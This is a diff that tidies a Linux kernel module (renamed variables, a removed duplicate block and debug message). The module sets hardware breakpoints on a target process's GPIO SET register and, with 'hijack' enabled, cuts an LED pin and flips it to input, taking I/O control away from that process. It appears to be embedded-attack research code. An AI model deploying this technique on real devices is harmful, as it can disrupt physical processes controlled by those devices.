@@ -10,9 +10,9 @@
 #include <linux/perf_event.h>
 #include <linux/hw_breakpoint.h>
 
-static int ppid= 0;
-static int hijack=0;
-static long ubp=0;
+static int ppid = 0;
+static int hijack = 0;
+static long set_p = 0;
 static char* gpioB = "0x00";
 int tCount = 0;
 static struct perf_event* pThread[20];
@@ -26,7 +26,6 @@ MODULE_PARM_DESC(gpioB, "Base address of GPIO");
 module_param(hijack, int, S_IRUSR | S_IWUSR | S_IRGRP | S_IROTH);
 MODULE_PARM_DESC(hijack, "Hijack the control"); // 1=Yes, 0=No
 
-
 #define INP_GPIO(g) *(gpio+((g)/10)) &= ~(7<<(((g)%10)*3))
 #define OUT_GPIO(g) *(gpio+((g)/10)) |=  (1<<(((g)%10)*3))
 #define SET_GPIO_ALT(g,a) *(gpio+(((g)/10))) |= (((a)<=3?(a)+4:(a)==4?3:2)<<(((g)%10)*3))
@@ -39,10 +38,9 @@ MODULE_PARM_DESC(hijack, "Hijack the control"); // 1=Yes, 0=No
 static void dr_excp_handler(struct perf_event *bp, struct perf_sample_data *data, struct pt_regs *regs) {
 
 	int g = 22; // Pin 22 attached to LED
-	if(hijack == 1) {
+	if (hijack == 1) {
 		GPIO_CLR = 1 << g; // Put LED off
 		INP_GPIO(g); // Set LED pin as input, so the logic could not write anymore
-		printk(KERN_INFO "[DR] Inji bas masss, yani kolliiish bas mass\n");
 	}
 
 }
@@ -63,17 +61,12 @@ static int __init hw_break_module_init(void) {
 		return 0;
 	}
 
-	hw_breakpoint_init(&attr);
-	attr.bp_addr = ubp;
-	attr.bp_len = HW_BREAKPOINT_LEN_4;
-	attr.bp_type = HW_BREAKPOINT_RW;
-
 	gpio = (unsigned *)l; // GPIO base
-	ubp = (l+(long)0x1C); // Offset of SET register
+	set_p = (l+(long)0x1C); // Offset of SET register
 
 	printk(KERN_INFO "[DR] Target process: %d\n", ppid);
 	printk(KERN_INFO "[DR] GPIO Base address: %x %s %lu\n", (unsigned)gpio, gpioB, l);
-	printk(KERN_INFO "[DR] GPIO SET Register: 0x%lx\n", ubp);
+	printk(KERN_INFO "[DR] GPIO SET Register: 0x%lx\n", set_p);
 	printk(KERN_INFO "[DR] Hijack: %d\n", hijack);
 
 	tsk = pid_task(find_vpid(ppid), PIDTYPE_PID);
@@ -82,9 +75,8 @@ static int __init hw_break_module_init(void) {
 	if (tsk) {
 		printk(KERN_INFO "[DR] Userland process struct_tsk PID: %d\n", ppid);
 		do {
-
 			hw_breakpoint_init(&attr);
-			attr.bp_addr = ubp;
+			attr.bp_addr = set_p;
 			attr.bp_len = HW_BREAKPOINT_LEN_4;
 			attr.bp_type = HW_BREAKPOINT_RW;
 
@@ -96,7 +88,7 @@ static int __init hw_break_module_init(void) {
 			}
 
 			printk(KERN_INFO "[DR_Thread] Setting DR registers... done\n");
-			tCount +=1;
+			tCount += 1;
 		} while_each_thread(tsk, tTsk);
 		printk(KERN_INFO "Thread count: %d\n", tCount);
 	} else {
